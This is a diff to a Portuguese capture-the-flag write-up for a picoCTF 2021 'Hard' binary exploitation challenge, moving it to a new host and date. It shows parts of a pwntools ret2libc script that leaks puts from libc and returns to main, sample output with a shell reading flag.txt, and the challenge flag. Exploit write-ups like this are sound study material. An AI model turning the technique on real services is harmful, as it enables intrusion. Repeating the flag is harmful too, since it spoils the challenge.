@@ -5,10 +5,11 @@
 | | |
 |---|---|
 | **Plataforma / evento** | picoCTF 2021 |
+| **Plataforma (hoje)** | CyLab Academy (`cylabacademy.net`) |
 | **Categoria** | Binary Exploitation |
 | **Dificuldade / pontos** | Hard |
 | **Autor do desafio** | madStacks |
-| **Resolvido em** | 2026-05-18 |
+| **Resolvido / revalidado em** | 2026-11-02 |
 
 ## TL;DR
 
@@ -38,7 +39,7 @@
 - **Máquina atacante:** Kali Linux, com `pwntools` (`pip install pwntools`).
 - **Arquivos:** `vuln` e `libc.so.6` na raiz da pasta do desafio.
 
-Na minha instância o serviço estava em `wily-courier.picoctf.net:60182`.
+Na minha instância o serviço estava em `chatelaine.cylabacademy.net:22586`. O binário e a `libc.so.6` são os mesmos de sempre (confirmei por `sha256`); os gadgets e o offset abaixo valem para eles. A base da libc muda a cada conexão (ASLR) e o sufixo da flag muda por instância.
 
 ## Resolução
 
@@ -88,7 +89,7 @@ puts_plt = elf.plt["puts"]
 puts_got = elf.got["puts"]
 main     = elf.symbols["main"]
 
-p = remote("wily-courier.picoctf.net", 60182)
+p = remote("chatelaine.cylabacademy.net", 22586)
 
 # Fase 1: vazar puts@libc e voltar para main
 payload1  = b"A"*offset
@@ -120,13 +121,10 @@ python3 scripts/script1.py
 ```
 
 ```text
-[+] puts leak = 0x78ba7379da30
-[+] libc base = 0x78ba7371d000
-[+] system = 0x78ba7376c4e0
-[+] /bin/sh = 0x78ba738d10fa
-[*] Switching to interactive mode
+pop_rdi=0x400913 ret=0x40052e
+puts_leak=0x70ebb1a58a30 libc_base=0x70ebb19d8000
 $ cat flag.txt
-picoCTF{1_l0v3_sm4sh_st4cking_c760ecba2fcfc9f7}
+academy{1_l0v3_sm4sh_st4cking_a768fad93c2XXXXX}
 ```
 
 ## Cadeia de ataque
@@ -163,5 +161,5 @@ O estouro dá controle do RIP. Sem PIE, os gadgets e a PLT/GOT têm endereços f
 ## Flag
 
 ```text
-picoCTF{1_l0v3_sm4sh_st4cking_c760ecba2fcfc9f7}
+academy{1_l0v3_sm4sh_st4cking_a768fad93c2XXXXX}
 ```
